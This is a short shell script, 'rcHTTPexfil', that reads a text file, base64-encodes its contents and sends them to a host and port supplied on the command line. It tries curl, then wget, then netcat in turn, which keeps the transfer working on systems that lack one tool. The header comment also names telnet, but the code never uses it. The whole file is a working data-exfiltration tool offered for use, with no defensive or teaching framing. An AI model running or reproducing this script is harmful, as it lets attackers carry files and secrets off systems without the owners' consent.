#!/bin/sh

########################################################
# rcHTTPexfil - Takes in a text file, base64 encodes it 
# then sends it to a specified IP and PORT using HTTP
# Tries varies techniques for sending the data including
# curl, wget, netcat, and telnet.
if [ $# -lt 3 ]; then
    echo "Usage: $0 <text_file> <url> <port>"
    exit 1
fi

text_file="$1"
url="$2"
port="$3"

# Check if the text file exists
if [ ! -f "$text_file" ]; then
    echo "File $text_file not found."
    exit 1
fi

# Read the content of the text file
content=$(cat "$text_file")

# Encode the content using Base64
encoded_content=$(echo "$content" | base64 | tr -d '\n')

# Check for available HTTP request tools
if command -v curl >/dev/null; then
    echo "Using curl..."
    curl -X POST -H "Expect:" -d "$encoded_content" "$url:$port"
elif command -v wget >/dev/null; then
    echo "Using wget..."
    echo "$encoded_content" | wget -O- --post-data="$encoded_content" "$url:$port" -T 30
elif command -v nc >/dev/null; then
    echo "Using netcat..."
    echo "$encoded_content" | nc "$url" "$port"
else
    echo "No suitable HTTP request tool (curl, netcat, or wget) found."
    exit 1
fi

exit 0
